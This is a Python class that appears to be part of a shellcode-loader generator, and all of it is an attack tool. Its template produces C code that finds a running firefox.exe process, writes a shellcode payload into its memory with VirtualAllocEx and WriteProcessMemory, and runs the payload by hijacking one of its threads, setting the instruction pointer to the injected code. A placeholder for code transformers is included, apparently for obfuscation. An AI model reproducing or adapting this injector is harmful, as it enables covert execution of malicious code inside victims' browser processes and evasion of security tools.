class threadhijack:

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>", 
                "#include <winternl.h>", 
                "#include <tlhelp32.h>"]

    def compilerOptions(self) -> list[str]:
        return []

    def template(self) -> str:
        return """

{imports}

{codeblocks}
        
int main(void)
{{

    
    {transformers}
    
    int pid = 0;
    HANDLE hProc = NULL;

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap)
        return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32))
    {{
        CloseHandle(hProcSnap);
        return 0;
    }}

    while (Process32Next(hProcSnap, &pe32))
    {{
        if (lstrcmpiA("firefox.exe", pe32.szExeFile) == 0)
        {{
            pid = pe32.th32ProcessID;
            break;
        }}
    }}

    CloseHandle(hProcSnap);

    hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                            FALSE, (DWORD)pid);


    LPVOID pRemoteCode = NULL;
    CONTEXT ctx;

    // find a thread in target process
    HANDLE hThread = NULL;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    while (Thread32Next(Snap, &thEntry))
    {{
        if (thEntry.th32OwnerProcessID == pid)
        {{
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
            break;
        }}
    }}
    CloseHandle(Snap);

    // perform payload injection
    pRemoteCode = VirtualAllocEx(hProc, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);

    // execute the payload by hijacking a thread in target process
    SuspendThread(hThread);
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
#ifdef _M_IX86
    ctx.Eip = (DWORD_PTR)pRemoteCode;
#else
    ctx.Rip = (DWORD_PTR)pRemoteCode;
#endif
    SetThreadContext(hThread, &ctx);

    ResumeThread(hThread);
    
    CloseHandle(hProc);
    return 0;
}}
"""